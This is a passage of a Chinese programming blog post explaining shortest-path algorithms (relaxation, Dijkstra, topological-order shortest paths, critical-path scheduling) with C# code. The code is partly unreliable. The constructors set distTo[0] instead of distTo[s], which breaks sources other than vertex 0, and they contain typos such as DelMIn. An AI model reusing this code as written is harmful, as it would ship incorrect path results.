&lt;p&gt;　　我们约定，edgeTo[s] 的值为 null，distTo[s] 的值为 0，从起点到不可达的顶点的距离为 Double.MaxValue。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　边的松弛&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　我们的最短路径 API 的实现都基于一个被称为&lt;strong&gt;松弛（relaxation）&lt;/strong&gt;的简单操作。一开始我们只知道图的边和它们的权重，distTo[ ] 中只有起点所对应的元素的值为 0 ，其余元素的值均被初始化为 Double.MaxValue 。 随着算法的执行，它将起点到其他顶点的最短路径信息存入 edgeTo[ ] 和 distTo[ ] 数组。在遇到新的边时，通过更新这些信息就可以得到最短路径。特别是，我们在其中会用到边的松弛技术，定义为：放松边 v -&amp;gt; w 意味着检查从 s 到 w 的最短路径是否是先从 s 到 v，然后再由 v 到 w 。如果是，则根据这个情况更新数据结构的内容。由 v 到 w 的最短路径是 distTo[v] 与 e.Weight() 之和 —— 如果这个值不小于 distTo[w] ，则这条边失效并忽略。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Relax(DirectedEdge e)
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; v = e.From(), w =&lt;span&gt; e.To();
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(distTo[w] &amp;gt; distTo[v] +&lt;span&gt; e.Weight())
    {
        distTo[w] &lt;/span&gt;= distTo[v] +&lt;span&gt; e.Weight();
        edgeTo[w] &lt;/span&gt;=&lt;span&gt; e;
    }
}    &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　下图是边的放松操作之后可能出现两种情况。一种情况是边失效（左边），不更新任何数据；另一种情况是 v -&amp;gt; w 就是到达 w 的最短路径（右边），这将会更新 edgeTo[w] 和 distTo[w] （这可能会使另一些边失效，但也可能产生一些新的有效边）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201216075518164-1461719928.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　顶点的松弛&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　实际上，实现会放松从一个给定顶点指出的所有边。从任意 distTo[v] 为有限值的顶点 v 指向任意 distTo[ ] 为无穷的顶点的边都是有效的。如果 v 被放松，那么这些有效边都会被添加到 edgeTo[ ] 中。某条从起点指出的边将会是第一条被加入 edgeTo[ ] 中的边。算法会谨慎选择 顶点，使得每次顶点松弛操作都能得出到达某个顶点的更短路径，最后逐渐找出到达每个顶点的最短路径。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Relax(EdgeWeightDigraph G,&lt;span&gt;int&lt;/span&gt;&lt;span&gt; v)
{
     &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;(DirectedEdge e &lt;span&gt;in&lt;/span&gt;&lt;span&gt; G.Adj(v))
     {
          &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; w =&lt;span&gt; e.To();
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(distTo[w] &amp;gt; distTo[v] +&lt;span&gt; e.Weight())
          {
               distTo[w] &lt;/span&gt;= distTo[v] +&lt;span&gt; e.Weight();
               edgeTo[w] &lt;/span&gt;=&lt;span&gt; e;
          }
     }  
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　3.最短路径算法的理论基础&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　边的放松一项非常容易实现的重要操作，它是实现最短路径算法的基础。同时，它也是理解这个算法的理论基础并使我们能够完整地证明算法的正确性。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　最优性条件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　最短路径的最优性条件：令 G 为一幅加权有向图，顶点 s 是 G 中的起点，distTo[ ]  是一个由顶点索引的数组，保存的是 G 中路径的长度。对于从 s 可达的所有顶点 v ，distTo[v] 的值是从 s 到 v 的某条路径的长度，对于从 s 不可达的所有顶点  v ,该值为无穷大。当且仅当对于从 v 到 w 的任意一条边 e ，这些值都满足 distTo[w] &amp;lt;= distTo[v] + e.Weight() 时（换句话说，不存在有效边时），它们是最短路径的长度。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;验证&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　上面最优性条件的一个重要的实际应用是最短路径的验证。无论一种算法会如何计算 distTo[ ] ，都只需要遍历图中的所有边一边并检查最优性条件是否满足就能够知道该数组中的值是否是最短路径的长度。最短路径的算法可能会很复杂，因此能够快速验证计算的结果就很重要。后面会有 Check（） 方法。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　通用算法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;通用最短路径算法：&lt;/strong&gt;将 distTo[s] 初始化为 0 ，其他 distTo[ ] 元素初始化为无穷达，继续如下操作：&lt;/p&gt;
&lt;p&gt;　　　　放松 G 中的任意边，直到不存在有效边为止。&lt;/p&gt;
&lt;p&gt;　　对于任意从  s 可达的顶点 w ，在进行这些操作之后，distTo[w] 的值即为从 s 到 w 的最短路径的长度且 edgeTo[w] 的值即为该路径上的最后一条边。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;证明：&lt;/strong&gt;放松边 v -&amp;gt; w 必然会将 distTo[w] 的值设为从 s 到 w 的某条路径的长度且将 edgeTo[w] 设为该路径上的最后一条边。对于从 s 可达的任意顶点 w，只要 distTo[w] 仍然是无穷达，到达 w 的最短路径上的某条边肯定仍然是有效的，因此算法的操作会不断继续，直到由 s 可达的每个顶点的 distTo[ ] 值均变为到达顶点的某条路径的长度。对于已经找到最短路径的任意顶点 v ，在算法的计算过程中 distTo[v] 的值都是从 s 到 v 的某条路径的长度且必然是单调递减的。因此，它递减的次数必然是有限的（每切换一条 s 到 v 简单路径就递减一次）。当不存在有效边的时候，最优性条件就成立了。&lt;/p&gt;

&lt;p&gt;　　将最优性条件和通用算法放在一起讨论的关键原因是，通用算法并没有指定边的放松顺序。因此，要证明这些算法都能通过计算得到最短路径，只需要证明它们都会放松所有的边直到所有边都失效即可。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　4.Dijkstra 算法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　在&lt;a href=&quot;https://www.cnblogs.com/afei-24/p/14018230.html&quot; target=&quot;_blank&quot;&gt;最小生成树&lt;/a&gt;中，分享了寻找加权无向图中的最小生成树的 Prim 算法：构造最小生成树的每一步都向这棵树中添加一条新的边。Dijkstra 算法采用了类似的方法来计算最短路径树。首先将 distTo[s] 初始化为 0，distTo[ ] 中的其他元素初始化为正无穷大。然后将 distTo[ ] 最小的非树顶点放松并加入树中，如此这般，直到所有的顶点都在树中&lt;span&gt;或者所有的非树顶点的 distTo[ ] 值均为无穷大&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;　　Dijkstra 算法能够解决边权重非负的加权有向图的单起点最短路径问题。&lt;strong&gt;证明&lt;/strong&gt;：如果 v 是从起点可达的，那么所有 v -&amp;gt; w 的边都只会被放松一次。当 v 被放松时，必有 distTo[w] &amp;lt;= distTo[v] + e.Weight() 。该不等式在算法结束前都会成立，因此 distTo[v] 则不会改变（因为边的权重非负且在每一步中算法都会选择 distTo[ ] 最小的顶点，之后的放松操作不可能使任何 distTo[ ] 的值小于 distTo[v]）。因此，在所有从 s 可达的顶点均被添加到树中之后，最短路径的最优性条件成立。&lt;/p&gt;

&lt;p&gt; 　　&lt;strong&gt;数据结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　要实现 Dijkstra 算法，除了 distTo[ ]  和 edgeTo[ ] 数组之外还需要一条索引&lt;a href=&quot;https://www.cnblogs.com/afei-24/p/13375584.html&quot; target=&quot;_blank&quot;&gt;优先队列&lt;/a&gt; pq ，以保存需要被放松的顶点。 IndexMinPQ 可以将索引和键（优先级）关联起来并且可以删除并返回优先级最低的索引。在这里，只要将顶点 v 和 distTo[v] 关联起来就立即可以得到 Dijkstra 算法的实现。edgeTo[ ] 中的元素所对应的可达顶点构成了一棵最短路径树。&lt;/p&gt;

&lt;p&gt;　　如下图，根据算法的证明，已知树节点所对应的 distTo[ ] 值均为最短路径的长度。对于优先队列中的任意顶点 w ，distTo[w] 是从 s 到 w 的最短路径的长度，该路径上的中间顶点在树中且路径结束于横切边 edgeTo[w] 。优先级最小的顶点的 distTo[ ] 值就是最短路径的权重，它不会小于已经放松过的任意顶点的最短路径的权重，也不会大于还未被放松过的任意顶点的最短路径的权重。这个顶点就是下一个要被放松的顶点。所有从 s 可达的顶点都会按照最短路径的权重顺序被放松。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201218075300013-1893706580.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;实现&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DijkstraSP
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; DirectedEdge[] edgeTo;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt;[] distTo;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; IndexMinPQ&amp;lt;Double&amp;gt;&lt;span&gt; pq;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; DijkstraSP(EdgeWeightedDigraph G,&lt;span&gt;int&lt;/span&gt;&lt;span&gt; s)
        {
            edgeTo &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DirectedEdge[G.V()];
            distTo &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt;[G.V()];
            pq &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; IndexMinPQ&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(G.V());

            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; v = &lt;span&gt;0&lt;/span&gt;; v &amp;lt; G.V(); v++&lt;span&gt;)
            {
                distTo[v] &lt;/span&gt;=&lt;span&gt; Double.MaxValue;
            }

            distTo[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;0.0&lt;/span&gt;&lt;span&gt;;
            pq.Insert(s,&lt;/span&gt;&lt;span&gt;0.0&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (!&lt;span&gt;pq.IsEmpty())
            {
                Relax(G,pq.DelMIn());
            }
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Relax(EdgeWeightedDigraph G, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; v)
        {
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; e &lt;span&gt;in&lt;/span&gt;&lt;span&gt; G.Adj(v))
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; w =&lt;span&gt; e.To();
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (distTo[w] &amp;gt; distTo[v] +&lt;span&gt; e.Weight())
                {
                    distTo[w] &lt;/span&gt;= distTo[v] +&lt;span&gt; e.Weight();
                    edgeTo[w] &lt;/span&gt;=&lt;span&gt; e;

                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (pq.Contains(w))
                    {
                        pq.Change(w, distTo[w]);
                    }
                    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                    {
                        pq.Insert(w,distTo[w]);
                    }

                }
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;strong&gt;轨迹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　1.将顶点 0 添加到树中，将顶点 2 和 4 加入优先队列；&lt;/p&gt;
&lt;p&gt;　　2.从优先队列中删除顶点 2，将 0 -&amp;gt; 2 添加到树中，将顶点 7 加入优先队列；&lt;/p&gt;
&lt;p&gt;　　3.从优先队列中删除顶点 4，将 0 -&amp;gt; 4 添加到树中，将顶点 5 加入优先队列，边 4 -&amp;gt; 7 失效；&lt;/p&gt;
&lt;p&gt;　　4.从优先队列中删除顶点 7，将  2 -&amp;gt; 7添加到树中，将顶点 3 加入到优先队列，边 7 -&amp;gt; 5 失效；&lt;/p&gt;
&lt;p&gt;　　5.从优先队列中删除顶点 5，将 4 -&amp;gt; 5添加到树中，将顶点 1 加入优先队列，边 5 -&amp;gt; 7 失效；&lt;/p&gt;
&lt;p&gt;　　6.从优先队列中删除顶点 1，将 5 -&amp;gt; 1添加到树中，边 1 -&amp;gt; 3 失效；&lt;/p&gt;
&lt;p&gt;　　7.从优先队列中删除顶点 6，将 3 -&amp;gt; 6 添加到树中。　&lt;/p&gt;

&lt;p&gt;　　算法按照顶点到起点的最短路径的长度的增序将它们添加到最短路径树中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201219091737559-258206930.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　在一幅含有 V 个顶点和 E 条边的加权有向图中，使用 Dijkstra 算法计算结点为给定起点的最短路径树所需的空间与 V 成正比，时间与 ElogV 成正比（最坏情况下）。　　&lt;/p&gt;

&lt;p&gt; 　&lt;strong&gt;　变种&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　　只需对 Dijkstra 算法的实现稍作修改就能解决这个问题的其他版本。例如，加权无向图中的单点最短路径。&lt;/p&gt;
&lt;p&gt;　　如果将无向图看做有向图，创建一幅由相同顶点构成的加权有向图，且对于无向图中的每条边，相应地创建两条方向不同的有向边。有向图中的路径和无向图中的路径存在一一对应的关系，路径的权重也是相同的——最短路径的问题是等价的。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;给定两点的最短路径。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　给定一幅加权有向图以及一个起点 s 和一个终点 t，找到从 s 到 t 的最短路径。 &lt;/p&gt;
&lt;p&gt;　　要解决这个问题，可以使用 Dijkstra 算法并在从优先队列中取到 t 之后终止搜索。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;任意顶点对之间的最短路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;下面的代码解决了任意顶点对之间的最短路径问题，所需的时间和空间都与 EVlogV 成正比。它构造了 DijkstraSP 对象的数组，每个元素都将相应的顶点作为起点。在用例进行查询时，代码会访问起点所对应的单点最短路径对象并将目的顶点作为参数进行查询。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DijkstraAllPairsSP
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; DijkstraSP[] all;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; DijkstraAllPairsSP(EdgeWeightedDigraph G)
        {
            all &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DijkstraSP[G.V()];
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; v = &lt;span&gt;0&lt;/span&gt;; v &amp;lt; G.V(); v++&lt;span&gt;)
            {
                all[v] &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DijkstraSP(G,v);
            }
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; IEnumerable&amp;lt;DirectedEdge&amp;gt; Path(&lt;span&gt;int&lt;/span&gt; s, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; t)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; all[s].Path(t);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; Dist(&lt;span&gt;int&lt;/span&gt; s, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; t)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; all[s].Dist(t);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;strong&gt;欧几里得图中的最短路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　在顶点为平面上的点且边的权重于顶点欧几里得间距成正比的图中，解决单点，给定两点和任意顶点对之间的最短路径。&lt;/p&gt;
&lt;p&gt;　　下图是Dijkstra 算法在处理欧几里得图时用若干不同的起点产生最短路径树的过程。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201220092912749-1324364828.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　下面，将会考虑加权无环图中的最短路径算法并且将在线性时间内解决该问题。然后是负权重的加权有向图中的最短路径问题，Dijkstra 算法并不适用于这种情况。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　5.无环加权有向图中的最短路径算法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 　　许多应用中的加权有向图都是不含有有向环的。现在来看一种比 Dijkstra 算法更快，更简单的在无环加权有向图中找出最短路径的算法，它的特点是：&lt;/p&gt;
&lt;p&gt;　　1.能够在线性时间内解决单点最短路径的问题；&lt;/p&gt;
&lt;p&gt;　　2.能够处理负权重的边；&lt;/p&gt;
&lt;p&gt;　　3.能够解决相关的问题，例如找出最长的路径。&lt;/p&gt;
&lt;p&gt;　　这种算法是在&lt;a href=&quot;https://www.cnblogs.com/afei-24/p/13951947.html&quot; target=&quot;_blank&quot;&gt;有向图&lt;/a&gt;中学过的无环有向图的拓扑排序算法的简单扩展。&lt;/p&gt;

&lt;p&gt;　　特别的是，只要将顶点的放松和拓扑排序结婚起来，马上就能够得到一种解决无环加权有向图中的最短路径问题 的算法。首先，将 distTo[s] 初始化为 0 ，其他 distTo[ ]  元素初始化为无穷大，然后一个一个地按照拓扑顺序放松所有顶点。&lt;/p&gt;

&lt;p&gt;　　&lt;strong&gt;命题 S ：按照拓扑顺序放松顶点，就能在和 E+V 成正比的时间内解决无环加权有向图的单点最短路径问题。&lt;/strong&gt;每条边 v --&amp;gt; w 都只会被放松一次。当 v 被放松时，得到：distTo[w] &amp;lt;= distTo[v] + e.Weight() 。在算法结束前该不等式都成立，因为 distTo[v] 是不会变化的（因为是按照拓扑顺序放松顶点，在 v 被放松之后算法不会再处理任何指向 v 的边）而 distTo[w] 只会变小（任何放松操作都只会减小 distTo[ ] 中元素的值）。因此，在所有从 s 可达的顶点都被加入到树中后，最短路径的最优性条件成立。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; ShortestPaths
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 基于拓扑的无环加权有向图的最短路径算法
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AcyclicSP
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; DirectedEdge[] edgeTo;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt;[] distTo;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; AcyclicSP(EdgeWeightedDigraph G, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; s)
        {
            edgeTo &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DirectedEdge[G.V()];
            distTo &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt;[G.V()];

            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; G.V(); i++&lt;span&gt;)
            {
                distTo[i] &lt;/span&gt;=&lt;span&gt; Double.MaxValue;
            }
            distTo[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;] = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;

            Topological top &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Topological(G);
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; v &lt;span&gt;in&lt;/span&gt;&lt;span&gt; top.Order())
            {
                Relax(G,v);
            }
        }

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Relax(EdgeWeightedDigraph G, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; v)
        {
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (DirectedEdge e &lt;span&gt;in&lt;/span&gt;&lt;span&gt; G.Adj(v))
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; w =&lt;span&gt; e.To();
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (distTo[w] &amp;gt; distTo[v] +&lt;span&gt; e.Weight())
                {
                    distTo[w] &lt;/span&gt;= distTo[v] +&lt;span&gt; e.Weight();
                    edgeTo[w] &lt;/span&gt;=&lt;span&gt; e;
                }
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　示例轨迹：&lt;/p&gt;
&lt;p&gt;　　1.用深度优先搜索得到图的顶点的拓扑排序 5 1 3 6 4 7 0 2；&lt;/p&gt;
&lt;p&gt;　　2.将顶点 5 和从它指出的所有边添加到树中；&lt;/p&gt;
&lt;p&gt;　　3.将顶点 1 和边 1-&amp;gt;3 添加到树中；&lt;/p&gt;
&lt;p&gt;　　4.将顶点 3 和边 3-&amp;gt;6 添加到树中，边 3-&amp;gt;7 失效；&lt;/p&gt;
&lt;p&gt;　　5.将顶点 6 和边 6-&amp;gt;2, 6-&amp;gt;0 添加到树中，边 6-&amp;gt;4 失效；&lt;/p&gt;
&lt;p&gt;　　6.将顶点 4 和边 4-&amp;gt;0 添加到树中，边 4-&amp;gt;7 和 6-&amp;gt;0 失效；&lt;/p&gt;
&lt;p&gt;　　7.将顶点 7 和边 7-&amp;gt;2 添加到树中，边 6-&amp;gt;2 失效；&lt;/p&gt;
&lt;p&gt;　　8.将顶点 0 添加到树中，边 0-&amp;gt;2 失效；&lt;/p&gt;
&lt;p&gt;　　9.将顶点 2 添加到树中。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201221080403577-1062615392.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　命题 S 很重要，因为它的 “无环” 能够极大地简化问题的论断。对于最短路径问题，基于拓扑排序的方法比 Diijkstra 算法快的倍数与 Diijkstra 算法中所有优先队列操作的总成本成正比。另外，命题 S 的证明和边的权重是否非负无关，因此无环加权有向图不会受任何限制。用这个特点可以解决边的负权重问题。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;最长路径&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　　考虑在无环加权有向图中寻找最长路径的问题，边的权重可正可负。&lt;/p&gt;
&lt;p&gt;　　实现：复制原始无环加权有向图得到一个副本并将副本中的所有边的权重变为负值。这样，副本中的最短路径即为原图中的最长路径。要将最短路径问题的答案转换为最长路径问题的答案，只需将方案中的权重变为正值即可。所需时间与 E+V 成正比。&lt;/p&gt;
&lt;p&gt;　　轨迹：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201222075910842-1960115247.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　在一般的加权有向图（边的权重可能为负）中寻找最长简单路径的已知最好算法在最坏情况下所需的时间是指数级别。出现环的可能性似乎使这个问题的难度以指数级别增长。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;　　并行调度任务 &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; 　  这里再次考虑&lt;a href=&quot;https://www.cnblogs.com/afei-24/p/13951947.html&quot; target=&quot;_blank&quot;&gt;有向图&lt;/a&gt;中出现过的任务调度问题，这次解决一下调度问题：&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;优先级限制下的并行任务调度&lt;/strong&gt;。给定一组需要完成的任务和每个任务所需的时间，以及一组关于任务完成的先后次序的优先级限制。在满足限制条件的前提下应该如何在&lt;strong&gt;若干相同的处理器&lt;/strong&gt;（数量不限）安排任务并在&lt;strong&gt;最短时间内完成&lt;/strong&gt;所有任务？&lt;/p&gt;
&lt;p&gt;　　&lt;a href=&quot;https://www.cnblogs.com/afei-24/p/13951947.html&quot; target=&quot;_blank&quot;&gt;有向图&lt;/a&gt;中调度的模型默认只有单个处理器：将任务按照拓扑顺序排序，完成任务的总耗时就是所有任务所需要的总时间。现在假设有足够多的处理器并能够同时处理任意多的任务，受到的只有优先级的限制。&lt;/p&gt;
&lt;p&gt;　　存在一种线性时间的算法 —— 一种叫做“关键路径”的方法能够证明这个问题与无环加权有向图中的最长路径问题是等价的。&lt;/p&gt;

&lt;p&gt;　　假设任意可用的处理器都能在任务所需的时间内完成它，那么我们的重点就是尽早安排每一个任务。例如，下面表给出了一个任务调度问题。下图给出了解决方案，显示了这个问题所需的最短时间 173.0 。&lt;/p&gt;
&lt;p&gt;　　这份调度方案满足了所有限制条件，没有其他调度方案比这耗时更少，因为任务必须按照 0 -&amp;gt; 9 -&amp;gt; 6 -&amp;gt; 8 -&amp;gt; 2 的顺序完成。这个顺序就是这个问题的&lt;strong&gt;关键路径&lt;/strong&gt;。由优先级限制指定的每一列任务都代表了调度方案的一种可能的时间下限。如果将一系列任务的长度定义为完成所有任务的最早可能时间，那么最长的任务序列就是问题的关键路径，因为在这份任务序列中任何任务的启动延迟都会影响到整个项目的完成时间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201222205925371-2022101829.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;     &lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201222205958647-1250357553.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　&lt;strong&gt;解决：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　解决并行任务调度问题的关键路径方法的步骤如下：创建一幅无环加权有向图，其中包含一个起点 s 和一个终点 t 且每个人物都对应着两个顶点（一个&lt;strong&gt;起始&lt;/strong&gt;顶点和一个&lt;strong&gt;结束&lt;/strong&gt;顶点。对于每个任务都有一条从它的起始顶点指向结束顶点的边，边的权重为任务所需要的时间。对于每条优先级限制 v -&amp;gt; w ，添加一条从 v 的结束顶点指向 w 的起始顶点的权重为零的边。我们还需要为每个任务添加一条从起点指向该任务的起始顶点的权重为零的边以及一条从该任务的结束顶点到终点的权重为零的边。这样，每个任务预计的开始时间即为从起点到它的起始顶点的最长距离。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/984232/202012/984232-20201223074022336-1439278809.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　接下来就是在无环加权有向图中寻找一个最长路径——关键路径。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Main(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] args)
        {
            &lt;/span&gt;&lt;span&gt;string&lt;/span&gt;[] strs = File.ReadAllLines(&lt;span&gt;@&quot;&lt;/span&gt;&lt;span&gt;jobs.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; N = Int32.Parse(strs[&lt;span&gt;0&lt;/span&gt;]);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;任务数&lt;/span&gt;
            EdgeWeightedDigraph G = &lt;span&gt;new&lt;/span&gt; EdgeWeightedDigraph(&lt;span&gt;2&lt;/span&gt;*N+&lt;span&gt;2&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;2*N+2 为节点数，每个任务两个我节点，再加上起始两个节点&lt;/span&gt;
